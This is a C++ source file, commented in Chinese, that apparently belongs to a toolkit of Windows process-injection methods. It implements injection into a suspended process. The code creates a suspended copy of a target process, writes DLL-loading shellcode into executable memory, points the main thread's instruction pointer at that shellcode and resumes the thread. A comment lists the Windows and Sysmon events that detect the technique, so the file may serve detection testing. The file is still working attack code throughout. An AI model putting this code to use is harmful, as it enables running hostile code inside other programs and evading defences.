// ════════════════════════════════════════════════════════════════
//  方法 11: 挂起进程注入 (CREATE_SUSPENDED)
//
//  原理：
//    1. 以 CREATE_SUSPENDED 标志创建目标进程的副本
//    2. 进程已加载但主线程未执行
//    3. 在挂起进程中分配内存，写入 shellcode
//    4. 修改主线程上下文，EIP/RIP 指向 shellcode
//    5. ResumeThread 恢复执行
//    与方法 10 区别：用 CreateProcess 创建新实例而非操作已有进程
//
//  检测特征：
//    - Security 4688: CREATE_SUSPENDED 进程创建
//    - Sysmon Event 1: 进程创建（父进程是 inject.exe）
//    - Sysmon Event 8: 远程线程创建
// ════════════════════════════════════════════════════════════════
#include "../methods.h"
#include "../shellcode.h"

bool Inject_SuspendedProcess(DWORD pid, const wchar_t* dllPath)
{
    Print(L"  [*] 挂起进程注入 → PID=%lu\n", pid);

    // 1. 获取目标进程的可执行文件路径
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc)
    {
        Print(L"  [!] OpenProcess 失败: %lu\n", GetLastError());
        return false;
    }

    wchar_t exePath[MAX_PATH]{};
    DWORD size = MAX_PATH;
    QueryFullProcessImageNameW(hProc, 0, exePath, &size);
    CloseHandle(hProc);

    Print(L"  [+] 目标进程: %s\n", exePath);

    // 2. 以 CREATE_SUSPENDED 创建进程
    STARTUPINFOW si{ .cb = sizeof(si) };
    PROCESS_INFORMATION pi{};
    if (!CreateProcessW(exePath, nullptr, nullptr, nullptr, FALSE,
        CREATE_SUSPENDED, nullptr, nullptr, &si, &pi))
    {
        Print(L"  [!] CreateProcess 失败: %lu\n", GetLastError());
        return false;
    }
    Print(L"  [+] 挂起进程已创建 PID=%lu TID=%lu\n", pi.dwProcessId, pi.dwThreadId);

    // 3. 构造 shellcode
    size_t dllPathBytes = (wcslen(dllPath) + 1) * sizeof(wchar_t);

#ifdef _WIN64
    constexpr auto& tmpl       = SHELLCODE_TEMPLATE_X64;
    constexpr int  codeSize    = SHELLCODE_CODE_SIZE_X64;
    constexpr int  loadLibOff  = SHELLCODE_LOADLIB_OFF_X64;
    constexpr int  exitCodeOff = SHELLCODE_EXITCODE_OFF_X64;
    constexpr int  stringOff   = SHELLCODE_STRING_OFF_X64;
    constexpr int  ptrSize     = 8;
#else
    constexpr auto& tmpl       = SHELLCODE_TEMPLATE_X86;
    constexpr int  codeSize    = SHELLCODE_CODE_SIZE_X86;
    constexpr int  loadLibOff  = SHELLCODE_LOADLIB_OFF_X86;
    constexpr int  exitCodeOff = SHELLCODE_EXITCODE_OFF_X86;
    constexpr int  stringOff   = SHELLCODE_STRING_OFF_X86;
    constexpr int  ptrSize     = 4;
#endif

    size_t totalSize = (stringOff + dllPathBytes + 15) & ~15;
    std::vector<uint8_t> shellcode(totalSize, 0);
    memcpy(shellcode.data(), tmpl, sizeof(tmpl));

    LPVOID pLoadLib = GetLoadLibraryAddr();
    LPVOID pExit    = GetExitThreadAddr();
    memcpy(shellcode.data() + loadLibOff, &pLoadLib, ptrSize);
    memcpy(shellcode.data() + exitCodeOff + ptrSize + 3, &pExit, ptrSize);
    memcpy(shellcode.data() + stringOff, dllPath, dllPathBytes);

    // 4. 写入 shellcode 到挂起进程
    LPVOID remoteCode = VirtualAllocEx(pi.hProcess, nullptr, totalSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(pi.hProcess, remoteCode, shellcode.data(), totalSize, nullptr);
    Print(L"  [+] Shellcode 已写入 @ %p\n", remoteCode);

    // 5. 修改主线程上下文
    CONTEXT ctx{};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(pi.hThread, &ctx);

#ifdef _WIN64
    Print(L"  [+] 原始 RIP = %llX → 修改为 %llX\n", ctx.Rip, (DWORD64)remoteCode);
    ctx.Rip = (DWORD64)remoteCode;
#else
    Print(L"  [+] 原始 EIP = %X → 修改为 %X\n", ctx.Eip, (DWORD)remoteCode);
    ctx.Eip = (DWORD)remoteCode;
#endif

    SetThreadContext(pi.hThread, &ctx);

    // 6. 恢复执行
    ResumeThread(pi.hThread);
    Print(L"  [+] 主线程已恢复执行\n");

    WaitForSingleObject(pi.hThread, 5000);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    Print(L"  [✓] 挂起进程注入完成\n");
    return true;
}
